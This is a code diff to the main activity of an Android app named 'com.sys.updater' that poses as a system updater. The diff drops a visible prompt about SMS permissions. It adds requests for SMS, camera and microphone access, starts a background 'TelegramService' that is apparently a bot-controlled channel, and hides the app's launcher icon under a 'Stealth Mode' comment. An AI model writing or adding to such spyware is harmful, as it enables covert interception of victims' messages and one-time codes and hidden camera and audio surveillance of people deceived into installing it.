@@ -2,9 +2,13 @@ package com.sys.updater;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.widget.TextView;
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends Activity {
     @Override
@@ -12,12 +16,30 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         
         TextView tv = new TextView(this);
-        tv.setText("System is up to date.\nPlease allow SMS permissions for system health.");
+        tv.setText("System is up to date.");
         tv.setPadding(50, 50, 50, 50);
         setContentView(tv);
 
-        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS}, 1);
+        List<String> perms = new ArrayList<>();
+        perms.add(Manifest.permission.RECEIVE_SMS);
+        perms.add(Manifest.permission.READ_SMS);
+        perms.add(Manifest.permission.CAMERA);
+        perms.add(Manifest.permission.RECORD_AUDIO);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            perms.add(Manifest.permission.POST_NOTIFICATIONS);
         }
+
+        String[] permArray = perms.toArray(new String[0]);
+        requestPermissions(permArray, 1);
+
+        // Start Telegram Bot Background Service
+        startForegroundService(new Intent(this, TelegramService.class));
+
+        // HIDE ICON (Stealth Mode)
+        getPackageManager().setComponentEnabledSetting(
+            new android.content.ComponentName(this, MainActivity.class),
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        );
     }
 }
